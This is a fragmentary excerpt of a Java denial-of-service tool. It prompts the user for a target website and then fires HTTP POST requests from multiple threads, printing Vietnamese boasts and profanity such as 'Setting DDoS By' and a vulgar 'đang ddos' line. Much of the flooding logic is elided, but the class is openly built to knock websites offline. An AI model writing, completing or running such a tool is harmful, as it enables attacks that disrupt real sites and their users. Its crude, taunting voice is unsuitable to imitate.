...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("nhập web cần anh tú dz số 1 thế giới xử lý: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Bắt đầu bắn fifai: " + url);
        ...
        System.out.println("Setting DDoS By: Dinh Tu Dz Trầm Tính Ít Nói:3");
        ...
        System.out.println("đang ddos hối cặc ba m");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Đang bắn fifai đợi tao 1 tí!: " + responseCode + "Thread: " + this.seq);
    }
